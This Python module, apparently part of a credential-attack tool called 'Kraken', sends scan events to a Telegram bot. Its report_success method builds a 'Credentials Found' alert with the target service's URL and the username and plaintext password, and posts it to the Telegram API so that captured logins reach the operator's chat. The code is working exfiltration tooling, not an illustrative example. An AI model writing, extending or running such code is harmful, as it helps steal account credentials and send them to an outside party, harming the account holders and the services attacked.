#!/usr/bin/env python3
"""
Telegram Reporter Module for Kraken
Sends reports to Telegram with found credentials
"""

import json
import requests
import logging
from datetime import datetime

class TelegramReporter:
    """Handles Telegram notifications for found credentials"""
    
    def __init__(self, config_path="config.json"):
        """Initialize Telegram reporter with config"""
        self.config = self._load_config(config_path)
        self.bot_token = self.config.get("telegram", {}).get("bot_token", "")
        self.chat_id = self.config.get("telegram", {}).get("chat_id", "")
        self.enabled = self.config.get("telegram", {}).get("enabled", False)
        
        if self.enabled and (not self.bot_token or not self.chat_id):
            logging.warning("Telegram is enabled but bot_token or chat_id is missing")
            self.enabled = False
    
    def _load_config(self, config_path):
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load config: {e}")
            return {}
    
    def send_message(self, message):
        """Send a message to Telegram"""
        if not self.enabled:
            logging.debug("Telegram reporting is disabled")
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            response = requests.post(url, data=data, timeout=10)
            
            if response.status_code == 200:
                logging.info("Telegram message sent successfully")
                return True
            else:
                logging.error(f"Failed to send Telegram message: {response.text}")
                return False
        except Exception as e:
            logging.error(f"Error sending Telegram message: {e}")
            return False
    
    def report_success(self, service_name, service_url, username, password, additional_info=None):
        """Report successful credential discovery"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🎯 *Kraken - Credentials Found*

⏰ *Time:* {timestamp}
🌐 *Service:* {service_name}
🔗 *URL:* `{service_url}`
👤 *Username:* `{username}`
🔑 *Password:* `{password}`
"""
        
        if additional_info:
            message += f"\n📋 *Additional Info:*\n"
            for key, value in additional_info.items():
                message += f"   • {key}: `{value}`\n"
        
        return self.send_message(message)
    
    def report_scan_start(self, service_name, service_url):
        """Report scan start"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
🔍 *Kraken - Scan Started*

⏰ *Time:* {timestamp}
🌐 *Service:* {service_name}
🔗 *URL:* `{service_url}`
"""
        return self.send_message(message)
    
    def report_scan_complete(self, service_name, results_count):
        """Report scan completion"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
✅ *Kraken - Scan Completed*

⏰ *Time:* {timestamp}
🌐 *Service:* {service_name}
📊 *Results:* {results_count} credential(s) found
"""
        return self.send_message(message)
    
    def report_error(self, service_name, error_message):
        """Report error during scan"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
❌ *Kraken - Error*

⏰ *Time:* {timestamp}
🌐 *Service:* {service_name}
⚠️ *Error:* {error_message}
"""
        return self.send_message(message)
